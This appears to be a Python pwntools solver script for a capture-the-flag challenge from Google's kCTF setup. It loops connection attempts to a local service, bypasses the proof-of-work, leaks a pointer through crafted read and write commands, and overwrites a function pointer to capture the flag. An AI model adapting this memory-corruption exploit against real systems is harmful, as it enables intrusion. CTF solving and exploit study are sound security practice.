#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *
import pwnlib.tubes

count = 0
while count < 100:
    count += 1
    print('Attempt ' + str(count))

    r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
    def handle_pow(r):
        print(r.recvuntil(b'python3 '))
        print(r.recvuntil(b' solve '))
        challenge = r.recvline().decode('ascii').strip()
        p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
        solution = p.readall().strip()
        r.sendline(solution)
        print(r.recvuntil(b'Correct\n'))

    print(r.recvuntil(b'== proof-of-work: '))
    if r.recvline().startswith(b'enabled'):
        handle_pow(r)
    
    r.recvuntil(b'command:\n')
    r.send(b'C8 C16 C24 C32 C40\n')
    r.recvuntil(b'command:\n')
    r.send(b'W6 0 32AAAABBBBCCCCDDDDAAAABBBBCCCCDDDD R6\n')
    bytes_with_ptr = r.recvuntil(b'command:\n')[-29:-23]

    ptr = unpack(bytes_with_ptr, 48)
    ptr_func = ptr - 0x1120
    ptr_func_packed = pack(ptr_func, 48, "little", False)
    r.send(b'W6 128 6' + ptr_func_packed + b'W0 0 4exit\n')
    result = r.recvall(timeout=1)
    r.close()

    if b'FLAG' and b'AhMTEWhyWeNeedAsyncModeMTE' in result:
        print('!!!!!!!!!!!!!!!!')
        print(result)
        break

exit(0)
